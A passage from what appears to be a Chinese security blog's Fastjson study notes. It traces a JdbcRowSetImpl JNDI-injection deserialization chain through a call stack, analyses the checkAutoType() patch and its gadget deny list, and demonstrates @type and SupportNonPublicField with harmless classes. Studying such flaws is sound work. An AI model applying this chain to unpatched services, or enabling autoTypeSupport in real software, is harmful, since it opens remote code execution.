<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/29.png" alt="img"></p>
<p>接着调用到setAutoCommit()函数，设置autoCommit值，其中调用了connect()函数：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/30.png" alt="img"></p>
<p>跟进connect()函数，看到了熟悉的JNDI注入的代码即<code>InitialContext.lookup()</code>，并且其参数是调用<code>this.getDataSourceName()</code>获取的、即在前面setDataSourceName()函数中设置的值，因此lookup参数外部可控，导致存在JNDI注入漏洞：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/31.png" alt="img"></p>
<p>再往下就是JNDI注入的调用过程了，最后是成功利用JNDI注入触发Fastjson反序列化漏洞、达到任意命令执行效果。</p>
<p>调试过程的函数调用栈如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">connect:654, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:4081, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:57, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:606, Method (java.lang.reflect)</span><br><span class="line">setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:137, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:128, JSON (com.alibaba.fastjson)</span><br><span class="line">main:6, JdbcRowSetImplPoc</span><br></pre></td></tr></table></figure>

<h1 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h1><p>Ali在1.2.25版本打了补丁，主要添加了checkAutoType()函数替代了之前的locaClass函数。</p>
<h2 id="checkAutoType"><a href="#checkAutoType" class="headerlink" title="checkAutoType()"></a>checkAutoType()</h2><p>修补方案就是将DefaultJSONParser.parseObject()函数中的<code>TypeUtils.loadClass</code>替换为checkAutoType()函数：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200704233121675.png" alt="image-20200704233121675"></p>
<p>看下checkAutoType()函数，具体的可看注释：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// autoTypeSupport默认为False</span></span><br><span class="line">    <span class="comment">// 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            String accept = acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            String deny = denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从Map缓存中获取类，注意这是后面版本的漏洞点</span></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            String deny = denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            String accept = acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ClassLoader<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>) // <span class="title">classloader</span> <span class="title">is</span> <span class="title">danger</span></span></span><br><span class="line"><span class="class">            || <span class="title">DataSource</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>) // <span class="title">dataSource</span> <span class="title">can</span> <span class="title">load</span> <span class="title">jdbc</span> <span class="title">driver</span></span></span><br><span class="line"><span class="class">           ) </span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单地说，checkAutoType()函数就是使用黑白名单的方式对反序列化的类型继续过滤，acceptList为白名单（默认为空，可手动添加），denyList为黑名单（默认不为空）。</p>
<p>默认情况下，autoTypeSupport为False，即先进行黑名单过滤，遍历denyList，如果引入的库以denyList中某个deny开头，就会抛出异常，中断运行。</p>
<p>denyList黑名单中列出了常见的反序列化漏洞利用链Gadgets：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>

<p>这里可以看到黑名单中包含了”com.sun.”，这就把我们前面的几个利用链都给过滤了，成功防御了。</p>
<p>运行能看到报错信息，说autoType不支持该类：</p>
<p><img src="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/32.png" alt="img"></p>
<p>调试分析看到，就是在checkAutoType()函数中未开启autoTypeSupport即默认设置的场景下被黑名单过滤了从而导致抛出异常程序终止的：</p>
<p><img src="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/34.png" alt="img"></p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200704233707108.png" alt="image-20200704233707108"></p>
<h2 id="autoTypeSupport"><a href="#autoTypeSupport" class="headerlink" title="autoTypeSupport"></a>autoTypeSupport</h2><p>autoTypeSupport是checkAutoType()函数出现后ParserConfig.java中新增的一个配置选项，在checkAutoType()函数的某些代码逻辑起到开关的作用。</p>
<p>默认情况下autoTypeSupport为False，将其设置为True有两种方法：</p>
<ul>
<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeSupport=true</code></li>
<li>代码中设置：<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>，如果有使用非全局ParserConfig则用另外调用<code>setAutoTypeSupport(true);</code></li>
</ul>
<p>AutoType白名单设置方法：</p>
<ol>
<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li>
<li>代码中设置：<code>ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;);</code></li>
<li>通过fastjson.properties文件配置。在1.2.25/1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：`fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</li>
</ol>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>poc影响jdk 1.7，1.8版本，但是需要在parseObject的时候设置Feature.SupportNonPublicField，该字段在fastjson1.2.22版本引入，这么一说的话就是poc只能在1.2.22和1.2.24版本区间起作用。</p>
<p><a href="https://www.mi1k7ea.com/" target="_blank" rel="noopener">参考博客</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson学习笔记01</title>
    <url>/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>银鞍照白马，飒沓如流星。</p>
</blockquote>
<p>烦人的期末终于结束了，今天来总结归纳Fastjson漏洞及原理。</p>
<p>这会是一个连载，将会有多篇文章。</p>
<a id="more"></a>

<h1 id="Fastjson基本概念-amp-组件"><a href="#Fastjson基本概念-amp-组件" class="headerlink" title="Fastjson基本概念&amp;组件"></a>Fastjson基本概念&amp;组件</h1><p>Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口<em>JSON.toJSONString</em>和<em>JSON.parseObject/JSON.parse</em>来分别实现序列化和反序列化操作。</p>
<p><a href="https://github.com/alibaba/fastjson" target="_blank" rel="noopener">项目地址</a></p>
<p>组件api使用方法也很简洁</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//序列化</span></span><br><span class="line">String text = JSON.toJSONString(obj); </span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line">VO vo = JSON.parse(); <span class="comment">//解析为JSONObject类型或者JSONArray类型</span></span><br><span class="line">VO vo = JSON.parseObject(<span class="string">"&#123;...&#125;"</span>); <span class="comment">//JSON文本解析成JSONObject类型</span></span><br><span class="line">VO vo = JSON.parseObject(<span class="string">"&#123;...&#125;"</span>, VO<span class="class">.<span class="keyword">class</span>)</span>; <span class="comment">//JSON文本解析成VO.class类</span></span><br></pre></td></tr></table></figure>

<h1 id="使用Fastjson进行（反）序列化"><a href="#使用Fastjson进行（反）序列化" class="headerlink" title="使用Fastjson进行（反）序列化"></a>使用Fastjson进行（反）序列化</h1><p>以下使用测试均是基于1.2.24版本的fastjson jar包</p>
<p>建议从<a href="https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24" target="_blank" rel="noopener">maven仓库</a>中找到所有版本jar包,方便漏洞复现。</p>
<p>先构建需要序列化的Student类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonTmpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//执行那个函数就会打印出来</span></span><br></pre></td></tr></table></figure>

<p>再使用Fastjson组件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonTmpl;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJSerializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Student student = <span class="keyword">new</span> Student();</span><br><span class="line">        student.setName(<span class="string">"0range"</span>);</span><br><span class="line">        student.setAge(<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        String serializedStr = JSON.toJSONString(student);</span><br><span class="line">        System.out.println(<span class="string">"serializedStr="</span>+serializedStr);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"----------"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过parse方法进行反序列化，返回的是一个类对象</span></span><br><span class="line">        Object obj1 = JSON.parse(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">"parse反序列化对象名称:"</span>+obj1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parse反序列化："</span>+obj1);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"----------"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过parseObject,不指定类，返回的是一个JSONObject</span></span><br><span class="line">        Object obj2 = JSON.parseObject(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj2.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化:"</span>+obj2);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"----------"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过parseObject,指定类后返回的是一个相应的类对象</span></span><br><span class="line">        Object obj3 = JSON.parseObject(serializedStr,Student<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj3.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化:"</span>+obj3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上使用了三种形式反序列化<br>结果如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">serializedStr=&#123;<span class="string">"age"</span>:<span class="number">18</span>,<span class="string">"name"</span>:<span class="string">"0range"</span>&#125;</span><br><span class="line">----------</span><br><span class="line">parse反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parse反序列化：&#123;<span class="string">"name"</span>:<span class="string">"0range"</span>,<span class="string">"age"</span>:<span class="number">18</span>&#125;</span><br><span class="line">----------</span><br><span class="line">parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parseObject反序列化:&#123;<span class="string">"name"</span>:<span class="string">"0range"</span>,<span class="string">"age"</span>:<span class="number">18</span>&#125;</span><br><span class="line">----------</span><br><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">parseObject反序列化对象名称:FastjsonTmpl.Student</span><br><span class="line">parseObject反序列化:FastjsonTmpl.Student@<span class="number">78e03</span>bb5</span><br></pre></td></tr></table></figure>

<p>这里面parseObject({..})其实就是parse({..})的一个封装，对于parse的结果进行一次结果判定然后转化为JSONObject类型。</p>
<p>源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title">parseObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        Object obj = parse(text);</span><br><span class="line">        <span class="keyword">return</span> obj <span class="keyword">instanceof</span> JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Fastjson反序列化类图"><a href="#Fastjson反序列化类图" class="headerlink" title="Fastjson反序列化类图"></a>Fastjson反序列化类图</h1><p><img src="../images/FastJSON%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200622165338640.png" alt="image-20200622165338640"></p>
<p>SON：门面类，提供入口</p>
<p>DefaultJSONParser：主类</p>
<p>ParserConfig：配置相关类</p>
<p>JSONLexerBase：字符分析类</p>
<p>JavaBeanDeserializer：JavaBean反序列化类</p>
<h1 id="SerializerFeature-WriteClassName"><a href="#SerializerFeature-WriteClassName" class="headerlink" title="SerializerFeature.WriteClassName"></a>SerializerFeature.WriteClassName</h1><p>SerializerFeature.WriteClassName，是JSON.toJSONString()中的一个设置属性值，设置之后在序列化的时候会多写入一个@type，即写上被序列化的类名，type可以指定反序列化的类，并且调用其getter/setter/is方法。</p>
<p>Fastjson接受的JSON可以通过@type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作。</p>
<p>Demo：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Student student = <span class="keyword">new</span> Student();</span><br><span class="line">        student.setName(<span class="string">"0range"</span>);</span><br><span class="line">        student.setAge(<span class="number">18</span>);</span><br><span class="line">        String jsonstring = JSON.toJSONString(student, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(jsonstring);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置了SerializerFeature.WriteClassName</span></span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"FastjsonTmpl.Student"</span>,<span class="string">"age"</span>:<span class="number">18</span>,<span class="string">"name"</span>:<span class="string">"0range"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 未设置SerializerFeature.WriteClassName</span></span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">"age"</span>:<span class="number">18</span>,<span class="string">"name"</span>:<span class="string">"0range"</span>&#125;</span><br></pre></td></tr></table></figure>

<p>执行反序列化：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">"&#123;\"@type\":\"FastjsonTmpl.Student\",\"age\":18,\"name\":\"0range\"&#125;"</span>;</span><br><span class="line">        Student obj = JSON.parseObject(jsonstring, Student<span class="class">.<span class="keyword">class</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">FastjsonTmpl.Student@<span class="number">4</span>bf558aa</span><br><span class="line">FastjsonTmpl.Student</span><br></pre></td></tr></table></figure>

<h1 id="Feature-SupportNonPublicField"><a href="#Feature-SupportNonPublicField" class="headerlink" title="Feature.SupportNonPublicField"></a>Feature.SupportNonPublicField</h1><p>如果需要还原出private属性的话，还需要在反序列化组件JSON.parseObject/JSON.parse中加上Feature.SupportNonPublicField参数。</p>
<p>这里改下Student类，将私有属性age的setAge()函数注释掉（一般没人会给私有属性加setter方法，加了就没必要声明为private了）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public void setAge(int age) &#123;</span></span><br><span class="line"><span class="comment">//        System.out.println("setAge");</span></span><br><span class="line"><span class="comment">//        this.age = age;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在这两个都是private属性了，看看接下来会是什么结果。</p>
<p>修改FJTest2.java，去掉Feature.SupportNonPublicField，添加输出两个属性getter方法的返回值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">"&#123;\"@type\":\"FastjsonTmpl.Student2\",\"age\":18,\"name\":\"0range\"&#125;"</span>;</span><br><span class="line">        Student2 obj = JSON.parseObject(jsonstring, Student2<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">        System.out.println(obj.getName() + <span class="string">" "</span> + obj.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">FastjsonTmpl.Student2@<span class="number">4</span>bf558aa</span><br><span class="line">FastjsonTmpl.Student2</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line"><span class="number">0</span>range <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>可以看到，由于没有setage方法，年龄结果是0。</p>
<p>再接着添加Feature.SupportNonPublicField：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Student2 obj = JSON.parseObject(jsonstring, Student2<span class="class">.<span class="keyword">class</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">Student@<span class="number">2</span>c59109c</span><br><span class="line">Student</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line"><span class="number">0</span>range <span class="number">18</span></span><br></pre></td></tr></table></figure>

<p>这里写一下理解：</p>
